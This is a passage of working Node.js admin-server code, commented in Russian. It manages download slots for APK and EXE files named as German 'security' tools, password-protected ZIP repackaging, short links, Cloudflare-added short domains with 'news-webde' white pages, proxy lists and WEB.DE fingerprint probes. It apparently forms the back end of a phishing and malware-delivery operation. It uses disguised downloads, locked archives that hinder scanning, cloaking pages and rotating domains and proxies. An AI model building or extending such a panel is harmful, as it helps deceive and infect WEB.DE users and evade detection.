      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let slotIndex = 0;
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'slotIndex') {
            const val = body.slice(bodyStart, partEnd).toString('utf8').trim();
            const n = parseInt(val, 10);
            if (n >= 0 && n < DOWNLOAD_SLOTS_COUNT) slotIndex = n;
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const base = path.basename(filename) || 'android';
      const ext = path.extname(base).toLowerCase() || '.apk';
      const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const config = readAndroidDownloadConfig();
        config[slotIndex] = safeName;
        writeAndroidDownloadConfig(config);
        return send(res, 200, { ok: true, fileName: safeName, slotIndex });
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Write failed' });
      }
    });
    return true;
  }

  if (pathname === '/api/config/check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const checkId = Date.now() + '-' + Math.random().toString(36).slice(2, 10);
      const targetPath = path.join(CHECK_DIR, checkId);
      try {
        if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const meta = readCheckMeta();
        meta[checkId] = { name: safeName };
        writeCheckMeta(meta);
        const result = { ok: true, fileName: safeName, checkId };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          return send(res, 200, result);
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const runUnzip = (usePassword) => {
          const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
          const cmd = usePassword
            ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
            : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
          const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
          return (r.stdout || '') + (r.stderr || '');
        };
        let out = runUnzip(!!zipPassword);
        let list = parseUnzipList(out);
        if (list.length === 0 && zipPassword) out = runUnzip(false);
        if (list.length === 0) list = parseUnzipList(out);
        finishWithEntries(list);
      } catch (e) {
        try { if (fs.existsSync(targetPath)) fs.unlinkSync(targetPath); } catch (e2) {}
        const meta = readCheckMeta();
        delete meta[checkId];
        writeCheckMeta(meta);
        send(res, 500, { ok: false, error: (e && e.message) || 'Server error' });
      }
    });
    return true;
  }

  if (pathname === '/api/config/upload-apply' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const checkId = (json.checkId || '').trim();
      const slotIndex = json.slotIndex != null ? parseInt(json.slotIndex, 10) : -1;
      const useSlot = slotIndex >= 0 && slotIndex < DOWNLOAD_SLOTS_COUNT;
      const meta = readCheckMeta();
      const info = checkId ? meta[checkId] : null;
      const sourcePath = checkId ? path.join(CHECK_DIR, checkId) : null;
      if (!checkId || !info || !sourcePath || !fs.existsSync(sourcePath)) {
        return send(res, 400, { ok: false, error: 'Сначала нажмите Check и загрузите файл' });
      }
      const safeName = info.name;
      const isZip = path.extname(safeName).toLowerCase() === '.zip';
      const asIs = json.asIs === true;
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      /** Имя файла для слота: sicherheit-0.zip, sicherheit-1.exe и т.д. */
      function slotFileName(idx, ext) {
        return 'sicherheit-' + idx + (ext || path.extname(safeName) || '');
      }
      function applyToSlot(finalFileName) {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const finalPath = path.join(DOWNLOADS_DIR, finalFileName);
        fs.copyFileSync(sourcePath, finalPath);
        const config = readDownloadFilesConfig();
        config[slotIndex] = finalFileName;
        writeDownloadFilesConfig(config);
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
        send(res, 200, { ok: true, fileName: finalFileName });
      }
      try {
        if (isZip && asIs && useSlot) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const finalFileName = slotFileName(slotIndex, '.zip');
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          if (currentPassword) writeZipPassword(currentPassword);
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip && asIs) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          if (currentPassword) writeZipPassword(currentPassword);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        } else if (isZip && useSlot) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalFileName = slotFileName(slotIndex, '.zip');
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalPath = path.join(DOWNLOADS_DIR, newZipName);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, finalPath);
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: newZipName });
        } else if (useSlot) {
          const finalFileName = slotFileName(slotIndex);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        }
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip';
        }
        send(res, 500, { ok: false, error: friendly });
      }
    });
    return true;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = short.listShortLinks().map(function (o) { return { slug: o.code, url: o.url }; });
    return send(res, 200, { shortlinks: list });
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const slug = (json.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
      const url = (json.url || '').trim();
      if (!slug || !url) return send(res, 400, { ok: false, error: 'slug and url required' });
      const result = short.createShortLinkWithCode(slug, url);
      if (!result) return send(res, 400, { ok: false, error: 'invalid slug or url' });
      send(res, 200, { ok: true, slug: result.code, shortUrl: '/s/' + result.code });
    });
    return true;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
    if (!slug) return send(res, 400, { ok: false, error: 'slug required' });
    if (!short.deleteShortLink(slug)) return send(res, 404, { ok: false, error: 'not found' });
    send(res, 200, { ok: true });
    return true;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = readShortDomains();
    const arr = Object.keys(list).map(function (d) {
      const o = list[d];
      return { domain: d, targetUrl: o.targetUrl || '', whitePageStyle: o.whitePageStyle || '', status: o.status || 'pending', message: o.message || '', ns: o.ns || [] };
    });
    return send(res, 200, { list: arr, serverIp: process.env.SHORT_SERVER_IP || '' });
  }

  if (pathname === '/api/config/short-domains' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let domain = (json.domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '');
      const targetUrl = (json.targetUrl || '').trim();
      const whitePageStyle = (json.whitePageStyle || '').trim() === 'news-webde' ? 'news-webde' : '';
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
      const existing = list[domain];
      const entry = existing
        ? Object.assign({}, existing, { targetUrl: targetUrl || existing.targetUrl || '', whitePageStyle: whitePageStyle || existing.whitePageStyle || '' })
        : { targetUrl: targetUrl || '', whitePageStyle: whitePageStyle, status: 'pending', message: '', ns: [], createdAt: new Date().toISOString() };
      if (existing) {
        list[domain] = entry;
        writeShortDomains(list);
        return send(res, 200, { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' });
      }
      if (cfToken && serverIp) {
        addShortDomainToCloudflare(domain, serverIp, cfToken, function (err, ns) {
          if (err) {
            entry.status = 'error';
            entry.message = err.message || 'Cloudflare error';
            list[domain] = entry;
            writeShortDomains(list);
            return send(res, 200, { ok: true, domain: domain, status: 'error', message: entry.message, list: list });
          }
          entry.ns = ns || [];
          entry.message = ns && ns.length ? 'В Dynadot укажите NS: ' + ns.join(', ') : '';
          list[domain] = entry;
          writeShortDomains(list);
          send(res, 200, { ok: true, domain: domain, status: 'pending', ns: entry.ns, message: entry.message });
        });
      } else {
        entry.message = serverIp ? 'Добавьте домен в Cloudflare, A запись на ' + serverIp + ', в Dynadot укажите NS Cloudflare.' : 'Укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env для автодобавления в CF.';
        list[domain] = entry;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: 'pending', message: entry.message, serverIp: serverIp || '' });
      }
    });
    return true;
  }

  if (pathname === '/api/config/short-domains-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const domain = (json.domain || '').trim().toLowerCase().split('/')[0];
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      if (!list[domain]) return send(res, 404, { ok: false, error: 'domain not in list' });
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      if (!serverIp) return send(res, 200, { ok: false, status: 'error', message: 'SHORT_SERVER_IP не задан' });
      dns.resolve4(domain, function (err, addresses) {
        if (err || !addresses || addresses.length === 0) {
          list[domain].status = 'error';
          list[domain].message = err ? (err.code || err.message) : 'DNS не резолвится';
          writeShortDomains(list);
          return send(res, 200, { ok: true, domain: domain, status: 'error', message: list[domain].message });
        }
        const match = addresses.some(function (a) { return a === serverIp; });
        list[domain].status = match ? 'ready' : 'error';
        list[domain].message = match ? '' : 'IP домена ' + addresses[0] + ' не совпадает с сервером ' + serverIp;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: list[domain].status, message: list[domain].message });
      });
    });
    return true;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const domain = (parsed.query.domain || '').trim().toLowerCase().split('/')[0];
    if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
    const list = readShortDomains();
    if (!(domain in list)) return send(res, 404, { ok: false, error: 'not found' });
    delete list[domain];
    writeShortDomains(list);
    send(res, 200, { ok: true });
    return true;
  }

  if (pathname === '/api/config/zip-password' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { password: readZipPassword() });
  }

  if (pathname === '/api/config/zip-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const password = json.password != null ? String(json.password) : '';
      writeZipPassword(password);
      send(res, 200, { ok: true });
    });
    return true;
  }

  /** Нормализация строки прокси: принимает http(s)://, socks5://, разделители : ; | tab.
   * Поддерживает форматы:
   * - host:port
   * - host:port:login:password
   * - login:password:host:port
   * Всегда возвращает host:port:login:password (login/password пустые если не указаны).
   */
  function normalizeProxyLine(raw) {
    const s = String(raw || '').trim();
    if (!s) return null;
    let rest = s.replace(/^\s*(https?|socks5?|socks4?):\/\/\s*/i, '').trim();
    let parts = rest.split(':', 4);
    const portNum = (p) => { const n = parseInt(String(p || '').trim(), 10); return (n >= 1 && n <= 65535) ? n : NaN; };
    const isLikelyHost = (h) => {
      const x = String(h || '').trim();
      if (!x) return false;
      // ipv4 / localhost / domain; also allow raw hostnames
      if (x === 'localhost') return true;
      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(x)) return true;
      if (x.indexOf('.') !== -1) return true;
      return true;
    };
    if (parts.length === 4) {
      // host:port:login:pass
      if (!isNaN(portNum(parts[1])) && isLikelyHost(parts[0])) {
        const host = (parts[0] || '').trim();
        const port = portNum(parts[1]);
        const login = (parts[2] || '').trim();
        const password = (parts[3] || '').trim();
        if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
      }
      // login:pass:host:port
      if (!isNaN(portNum(parts[3])) && isLikelyHost(parts[2])) {
        const login = (parts[0] || '').trim();
        const password = (parts[1] || '').trim();
        const host = (parts[2] || '').trim();
        const port = portNum(parts[3]);
        if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
      }
    }
    if (parts.length >= 2 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    parts = rest.split(/[;\t|]+/);
    if (parts.length >= 2 && parts.length <= 4 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    // login;pass;host;port or login|pass|host|port etc
    if (parts.length === 4 && !isNaN(portNum(parts[3])) && isLikelyHost(parts[2])) {
      const login = (parts[0] || '').trim();
      const password = (parts[1] || '').trim();
      const host = (parts[2] || '').trim();
      const port = portNum(parts[3]);
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    return null;
  }

  if (pathname === '/api/config/proxies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const webdeProbeJobId = (q.webdeProbeJobId != null && String(q.webdeProbeJobId).trim()) ? String(q.webdeProbeJobId).trim() : '';
    if (webdeProbeJobId) {
      return sendWebdeFingerprintProbeStatus(res, webdeProbeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(PROXY_FILE)) content = fs.readFileSync(PROXY_FILE, 'utf8');
    } catch (e) {}
    const webdeFp = q.webdeFp === '1' || q.webdeFp === 'true' || q.webdeFp === 'yes';
    if (webdeFp) {
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      return send(res, 200, {
        content,
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
    return send(res, 200, { content });
  }

  if (pathname === '/api/config/proxies' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const hasIndicesOnly = Object.prototype.hasOwnProperty.call(json, 'webdeIndicesContent');
      if (hasIndicesOnly) {
        const indicesC = json.webdeIndicesContent != null ? String(json.webdeIndicesContent) : '';
        try {
          const dir = path.dirname(WEBDE_FP_INDICES_FILE);
          if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
          fs.writeFileSync(WEBDE_FP_INDICES_FILE, indicesC, 'utf8');
          const lineCount = indicesC.split(/\r?\n/).filter(function (l) {
            const t = (l || '').trim();
            return t.length > 0 && !t.startsWith('#');
          }).length;
          console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt (via /api/config/proxies): ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
        } catch (e) {
          return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
        }
        if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
          return send(res, 200, { ok: true });
        }
      }
      const content = json.content != null ? String(json.content) : '';
      if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
        return send(res, 400, { ok: false, error: 'content required for proxy save' });
      }
      try {
        // Нормализуем строки прокси в формат host:port:login:password, чтобы скрипты могли читать единообразно.
        const normalizedContent = String(content || '')
          .split(/\r?\n/)
          .map((line) => {
            const raw = String(line || '');
            const t = raw.trim();
            if (!t) return '';
            if (t.startsWith('#')) return raw;
            const parsed = normalizeProxyLine(t);
            return parsed ? parsed.normalized : raw;
          })
          .join('\n');
        const dir = path.dirname(PROXY_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(PROXY_FILE, normalizedContent, 'utf8');
        const lineCount = normalizedContent.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён proxy.txt: ' + PROXY_FILE + ', непустых строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write proxy file' });
      }
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const probeJobId = (q.probeJobId != null && String(q.probeJobId).trim()) ? String(q.probeJobId).trim() : '';
    if (probeJobId) {
      return sendWebdeFingerprintProbeStatus(res, probeJobId);
    }
    let content = '';
    try {
